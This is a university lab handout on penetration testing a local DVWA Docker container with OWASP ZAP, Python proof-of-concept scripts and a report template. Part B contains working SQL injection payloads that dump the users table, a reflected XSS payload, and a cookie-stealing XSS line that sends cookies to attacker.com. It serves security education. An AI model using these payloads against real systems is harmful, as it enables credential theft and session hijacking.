---
title: "Lab 07: Security Testing & Penetration Testing"
course: SCIA-425
topic: Security Testing and Penetration Testing
week: 8
difficulty: ⭐⭐⭐
estimated_time: 100 minutes
---

# Lab 07: Security Testing & Penetration Testing

| Field | Details |
|---|---|
| **Course** | SCIA-425 — Software Assurance and Quality |
| **Week** | 8 |
| **Difficulty** | ⭐⭐⭐ Advanced |
| **Estimated Time** | 100 minutes |
| **Topic** | Security Testing and Penetration Testing |
| **Prerequisites** | Docker installed and running, `pip install requests` |
| **Deliverables** | ZAP scan report, `pentest_findings.md`, `exploit_poc.py`, `remediation_plan.md` |

---

## Overview

Security testing goes beyond finding bugs — it proves that security requirements are violated under adversarial conditions. In this lab you will deploy a deliberately vulnerable web application in Docker, run **OWASP ZAP** automated scanning against it, manually verify and exploit selected findings with Python scripts, and write a professional penetration test report.

!!! danger "Ethics & Scope"
    This lab targets only the Docker container you launch on your own machine. **Never** run these tools against systems you do not own or have explicit written permission to test. Unauthorized scanning is illegal.

---

## Setup — Launch the Target

```bash
# Pull and run DVWA (Damn Vulnerable Web Application)
docker run --rm -d \
  -p 8080:80 \
  --name dvwa-target \
  vulnerables/web-dvwa

# Wait 10 seconds for startup, then initialize the database:
sleep 10
curl -s -c /tmp/dvwa_cookies.txt \
  -d "username=admin&password=password&Login=Login" \
  http://localhost:8080/login.php > /dev/null

curl -s -b /tmp/dvwa_cookies.txt \
  -d "create_db=Create+%2F+Reset+Database" \
  http://localhost:8080/setup.php > /dev/null

echo "DVWA ready at http://localhost:8080"
echo "Login: admin / password"
```

Set DVWA security to **Low** after login:
`http://localhost:8080/security.php` → Set to **Low** → Submit

---

## Part A — Automated ZAP Scan (30 pts)

Run OWASP ZAP in headless Docker mode to perform an active scan:

```bash
# ZAP active scan (takes ~5-10 minutes)
docker run --rm \
  --network host \
  -v "$PWD":/zap/wrk \
  ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py \
  -t http://localhost:8080 \
  -r zap_report.html \
  -J zap_report.json \
  -l WARN

# Copy report out
echo "Report saved to zap_report.html and zap_report.json"
```

**Open `zap_report.html` in a browser and answer in `pentest_findings.md`:**

1. How many alerts total? Break down by severity (High/Medium/Low/Informational)
2. List every **High** severity alert with:
   - Alert name
   - CWE ID
   - URL affected
   - Evidence string ZAP found
3. Which OWASP Top 10 categories are represented in the findings?

---

## Part B — Manual Exploitation (40 pts)

Manually verify and exploit two vulnerability classes using Python. Create `exploit_poc.py`:

### Exploit 1 — SQL Injection

DVWA's `/vulnerabilities/sqli/` endpoint is vulnerable to SQL injection in the `id` parameter.

```python
import requests

BASE = "http://localhost:8080"
SESSION = requests.Session()

# Authenticate
SESSION.post(f"{BASE}/login.php", data={
    "username": "admin", "password": "password", "Login": "Login"
})
SESSION.get(f"{BASE}/security.php?seclev_submit=Low&security=low")

# --- SQL Injection ---
def test_sqli_error_based():
    """Confirm SQL injection by triggering a database error."""
    r = SESSION.get(f"{BASE}/vulnerabilities/sqli/", params={"id": "1'", "Submit": "Submit"})
    if "error" in r.text.lower() or "syntax" in r.text.lower():
        print("[VULN] SQLi confirmed — error-based injection works")
        return True
    print("[INFO] No error response — try blind SQLi")
    return False

def extract_database_version():
    """Extract DB version using UNION-based SQLi."""
    payload = "1' UNION SELECT null, version() -- "
    r = SESSION.get(f"{BASE}/vulnerabilities/sqli/",
                    params={"id": payload, "Submit": "Submit"})
    # Parse version from response
    import re
    match = re.search(r'(\d+\.\d+\.\d+)', r.text)
    if match:
        print(f"[DATA] Database version: {match.group(1)}")
        return match.group(1)
    return None

def extract_users():
    """Extract usernames from DVWA users table."""
    payload = "1' UNION SELECT user, password FROM users -- "
    r = SESSION.get(f"{BASE}/vulnerabilities/sqli/",
                    params={"id": payload, "Submit": "Submit"})
    print("[DATA] Users table dump:")
    import re
    # DVWA outputs in <td> tags
    for m in re.findall(r'<td>([^<]+)</td>', r.text):
        print(f"  {m}")

if __name__ == "__main__":
    print("=== SQLi Exploit ===")
    if test_sqli_error_based():
        extract_database_version()
        extract_users()
```

### Exploit 2 — XSS (Reflected)

```python
def test_reflected_xss():
    """Confirm reflected XSS in the name parameter."""
    payload = '<script>alert("XSS-SCIA425")</script>'
    r = SESSION.get(f"{BASE}/vulnerabilities/xss_r/",
                    params={"name": payload, "Submit": "Submit"})
    if payload in r.text:
        print(f"[VULN] Reflected XSS confirmed — payload echoed unescaped")
        print(f"[URL]  {BASE}/vulnerabilities/xss_r/?name={requests.utils.quote(payload)}&Submit=Submit")
        return True
    else:
        print("[INFO] Payload not found — possibly filtered")
        return False

def test_xss_cookie_steal_simulation():
    """Demonstrate what a cookie-stealing XSS payload looks like (no actual exfil)."""
    steal_payload = '<img src=x onerror="document.location=\'http://attacker.com/steal?c=\'+document.cookie">'
    r = SESSION.get(f"{BASE}/vulnerabilities/xss_r/",
                    params={"name": steal_payload, "Submit": "Submit"})
    if "onerror" in r.text:
        print("[VULN] Cookie-stealing XSS payload reflected — session hijack possible")
```

Run and capture all output:
```bash
python exploit_poc.py 2>&1 | tee exploit_output.txt
```

---

## Part C — Penetration Test Report (30 pts)

Write a professional `pentest_findings.md` structured as a real pentest deliverable:

```markdown
# Penetration Test Report
**Target:** DVWA (http://localhost:8080)
**Tester:** [Your Name]
**Date:** [Date]
**Scope:** Docker container only, Low security level

---

## Executive Summary

[2–3 sentences: overall risk level, most critical findings, business impact]

---

## Findings Summary

| ID | Title | Severity | CVSS | CWE | Status |
|----|-------|----------|------|-----|--------|
| F-01 | SQL Injection in /vulnerabilities/sqli/ | Critical | 9.8 | CWE-89 | Confirmed + Exploited |
| F-02 | Reflected XSS in /vulnerabilities/xss_r/ | High | 7.4 | CWE-79 | Confirmed + Exploited |
| ... | | | | | |

---

## Detailed Findings

### F-01: SQL Injection — /vulnerabilities/sqli/

**Severity:** Critical (CVSS 9.8)
**CWE:** CWE-89 — Improper Neutralization of Special Elements in SQL Commands

**Description:** The `id` parameter in the user lookup endpoint is directly concatenated into a SQL query without parameterization, allowing an attacker to read arbitrary database contents.

**Evidence:**
```
Request: GET /vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users+--
Response: [show extracted data]
```

**Business Impact:** An attacker can extract all user credentials, pivot to admin account takeover, and potentially access all patient records.

**Remediation:** Use parameterized queries (`cursor.execute("SELECT ... WHERE id = ?", [user_id])`). No string concatenation with user input.

**References:** OWASP Top 10 A03:2021, CWE-89, NIST SP 800-53 SI-10

---
[Continue for each finding from ZAP + manual exploitation]
```

---

## Cleanup

```bash
docker stop dvwa-target
```

---

## Submission Checklist

- [ ] `zap_report.html` + `zap_report.json`
- [ ] `exploit_poc.py` — working (or explains why specific exploit failed)
- [ ] `exploit_output.txt` — captured output showing confirmed vulnerabilities
- [ ] `pentest_findings.md` — executive summary + all findings with evidence

---

## Grading

| Component | Points |
|-----------|--------|
| Part A — ZAP scan (report generated, High alerts analyzed, OWASP mapping) | 30 |
| Part B — exploit_poc.py (SQLi + XSS confirmed with evidence) | 40 |
| Part C — pentest_findings.md (professional format, all sections, remediation) | 30 |
| **Total** | **100** |
